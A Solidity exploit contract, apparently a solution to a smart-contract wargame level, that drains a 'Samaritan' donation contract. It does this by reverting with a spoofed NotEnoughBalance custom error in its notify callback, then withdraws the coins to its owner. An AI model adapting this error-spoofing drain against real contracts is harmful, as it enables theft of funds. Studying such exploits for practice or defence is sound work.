// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Samaritan {
    function requestDonation() external returns (bool enoughBalance);
}

interface Coin {
    function transfer(address dest_, uint256 amount_) external;
    function balances(address acc) external returns (uint256);
}

contract SamaritanHack {
    address public owner;

    error NotEnoughBalance();

    constructor() {
        owner = msg.sender;
    }

    function attackSamaritan(address targetAddress) external {
        Samaritan samaritan = Samaritan(targetAddress);
        samaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function withdraw(address coinAddress) external {
        Coin coin = Coin(coinAddress);
        uint256 balance = coin.balances(address(this));
        coin.transfer(owner, balance);
    }
}
